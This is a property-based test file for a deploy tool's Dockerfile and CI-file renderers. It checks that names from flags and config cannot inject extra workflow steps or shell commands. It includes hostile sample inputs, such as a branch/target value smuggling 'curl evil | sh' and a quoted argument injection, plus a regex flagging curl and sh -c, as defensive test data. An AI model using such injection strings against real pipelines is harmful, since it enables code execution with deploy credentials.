import * as fc from "fast-check";
import { parse } from "yaml";
import { describe, expect, it } from "vitest";
import { bitbucketPipelines, githubActions, gitlabCi, type CiRenderOptions } from "./ci.js";
import { parseDeployConfig } from "./config.js";
import { renderDockerfile } from "./dockerfile.js";
import { BRANCH_NAME, ENV_NAME, TARGET_NAME, UnsafeNameError } from "./safe-names.js";

/**
 * The files `blix deploy` generates run with deploy credentials, and copy in names from flags and from `blix.config.ts`.
 * A name is checked against what that kind of name can be, so nothing a name contains can become a second instruction,
 * an extra workflow step or a shell command. These properties throw hostile and arbitrary strings at that boundary.
 */

interface GithubWorkflow {
  on: { push: { branches: string[] } };
  jobs: Record<string, { steps: Array<{ run?: string; env?: Record<string, string> }> }>;
}

const PACKAGE_MANAGERS = ["pnpm", "npm", "yarn", "bun"] as const;
const target = fc.stringMatching(TARGET_NAME);
// The rule has a lookahead (and a flag) that `stringMatching` cannot generate from, so generate the plain shape and keep what the rule accepts.
const envName = fc.stringMatching(/^[A-Za-z_][A-Za-z0-9_]*$/).filter((name) => ENV_NAME.test(name));
const branch = fc.stringMatching(BRANCH_NAME);
/** The characters that matter in YAML, in a shell, or between lines: any of them must make a name unacceptable. */
const hostile = fc.oneof(
  fc.constantFrom("\n", "\r", "\"", "'", "`", "$", ";", "&", "|", "<", ">", "(", ")", "{", "}", "[", "]", ":", "#", "\\", " ", "\t", ","),
  fc.string({ minLength: 1, maxLength: 3 }),
);

function options(overrides: Partial<CiRenderOptions>): CiRenderOptions {
  return { target: "prod", packageManager: "pnpm", nodeVersion: "24", branch: "main", secrets: [], registry: undefined, docker: false, ...overrides };
}

describe("Dockerfile CMD", () => {
  it("is always a valid exec-form array of exactly node and the entry, whatever the entry holds", () => {
    fc.assert(
      fc.property(fc.string(), fc.constantFrom("pnpm", "npm"), (entry, packageManager) => {
        const lines = renderDockerfile({ packageManager, entry }).split("\n");
        const cmd = lines.filter((line) => line.startsWith("CMD "));

        expect(cmd).toHaveLength(1);
        expect(JSON.parse((cmd[0] ?? "").slice(4))).toEqual(["node", entry]);
      }),
      { numRuns: 1500 },
    );
  });

  it("never gains a line from the entry: a newline in it cannot add an instruction", () => {
    fc.assert(
      fc.property(fc.string(), (entry) => {
        const plain = renderDockerfile({ packageManager: "npm", entry: "dist/main.js" }).split("\n").length;

        expect(renderDockerfile({ packageManager: "npm", entry }).split("\n")).toHaveLength(plain);
      }),
      { numRuns: 1000 },
    );
  });

  it("treats the two documented injections as plain text in one argument", () => {
    const rendered = renderDockerfile({ packageManager: "npm", entry: 'dist/main.js", "--evil' });

    expect(rendered).toContain('CMD ["node", "dist/main.js\\", \\"--evil"]');
  });
});

describe("generated CI files", () => {
  it.each([githubActions, gitlabCi, bitbucketPipelines])("$id: a valid target, branch and variables always give a file that parses, with the structure the renderer promises", (provider) => {
    fc.assert(
      fc.property(target, branch, fc.uniqueArray(envName, { maxLength: 4 }), fc.constantFrom(...PACKAGE_MANAGERS), (name, branchName, secrets, packageManager) => {
        const text = provider.render(options({ target: name, branch: branchName, secrets, packageManager }));
        const doc: unknown = parse(text);

        expect(doc).toBeTypeOf("object");
        expect(text).toContain(`blix deploy ${name}`);
        // No line the hostile characters could have started: every line is one the renderer wrote.
        expect(text.split("\n").every((line) => !line.includes("\r") && !line.includes("\u0000"))).toBe(true);
      }),
      { numRuns: 400 },
    );
  });

  it("GitHub: the push trigger is exactly the branch, one deploy job, the step list fixed, and the env keys exactly the variables", () => {
    fc.assert(
      fc.property(target, branch, fc.uniqueArray(envName, { minLength: 1, maxLength: 4 }), fc.constantFrom("pnpm", "npm"), (name, branchName, secrets, packageManager) => {
        const doc: GithubWorkflow = parse(githubActions.render(options({ target: name, branch: branchName, secrets, packageManager })));
        const steps = doc.jobs["deploy"]?.steps ?? [];
        const deploy = steps.find((step) => step.run?.includes("blix deploy"));

        expect(doc.on.push.branches).toEqual([branchName]);
        expect(Object.keys(doc.jobs)).toEqual(["deploy"]);
        expect(deploy?.run).toMatch(new RegExp(`blix deploy ${name.replaceAll(".", "\\.")}$`));
        expect(Object.keys(deploy?.env ?? {}).toSorted()).toEqual([...secrets].toSorted());
        // The only step that runs a `blix` command is the one the renderer wrote; nothing was added.
        expect(steps.filter((step) => step.run !== undefined && /blix|curl|sh -c/.test(step.run))).toHaveLength(1);
      }),
      { numRuns: 400 },
    );
  });

  it.each([githubActions, gitlabCi, bitbucketPipelines])("$id: refuses a hostile target name, branch or variable instead of writing it", (provider) => {
    fc.assert(
      fc.property(hostile, fc.constantFrom("target", "branch", "secret", "registry"), (bad, where) => {
        fc.pre(!TARGET_NAME.test(`a${bad}`) || where !== "target");
        fc.pre(!BRANCH_NAME.test(`main${bad}`) || where !== "branch");
        fc.pre(!ENV_NAME.test(`A${bad}`) || (where !== "secret" && where !== "registry"));
        const render = () =>
          provider.render(
            options(
              where === "target"
                ? { target: `a${bad}` }
                : where === "branch"
                  ? { branch: `main${bad}` }
                  : where === "secret"
                    ? { secrets: [`A${bad}`] }
                    : { registry: { host: "ghcr.io", usernameEnv: `A${bad}`, passwordEnv: "PASS" } },
            ),
          );

        expect(render).toThrow(UnsafeNameError);
      }),
      { numRuns: 1500 },
    );
  });

  it("names the offending value as JSON so an invisible character shows", () => {
    expect(() => githubActions.render(options({ target: "prod\nrun: curl evil | sh" }))).toThrow('"prod\\nrun: curl evil | sh"');
  });
});

/** Loads a `deploy` section the way the CLI does, and reports "accepted" or the error text, so a property has one expectation. */
function outcomeOf(section: unknown): string {
  try {
    parseDeployConfig({ path: "/p/blix.config.ts", config: { deploy: section } });
    return "accepted";
  } catch (error) {
    return String(error);
  }
}

describe("blix.config.ts names", () => {
  it("accepts a target name exactly when it is a plain name, and refuses everything else with a message", () => {
    fc.assert(
      fc.property(fc.string({ minLength: 1, maxLength: 12 }), (name) => {
        const accepted = TARGET_NAME.test(name) && !["init", "build", "ci", "doctor", "help"].includes(name);

        // `__proto__` is dropped by the schema's record parsing (a prototype-pollution guard), so that one reads as an empty list.
        expect(outcomeOf({ targets: { [name]: { type: "docker", image: "app" } } })).toMatch(accepted ? /^accepted$/ : /can't be a target name|is a blix deploy command|deploy.targets is empty/);
      }),
      { numRuns: 1500 },
    );
  });

  it("accepts an env variable name exactly when it is one, for a target's env and for the registry", () => {
    fc.assert(
      fc.property(fc.string({ minLength: 1, maxLength: 10 }), (name) => {
        const inEnv = outcomeOf({ targets: { prod: { type: "docker", image: "app", env: [name] } } });
        const inRegistry = outcomeOf({ targets: { prod: { type: "docker", image: "app", registry: { host: "ghcr.io", usernameEnv: name } } } });

        const pattern = ENV_NAME.test(name) ? /^accepted$/ : /environment variable name/;
        expect(inEnv).toMatch(pattern);
        expect(inRegistry).toMatch(pattern);
      }),
      { numRuns: 1500 },
    );
  });
});
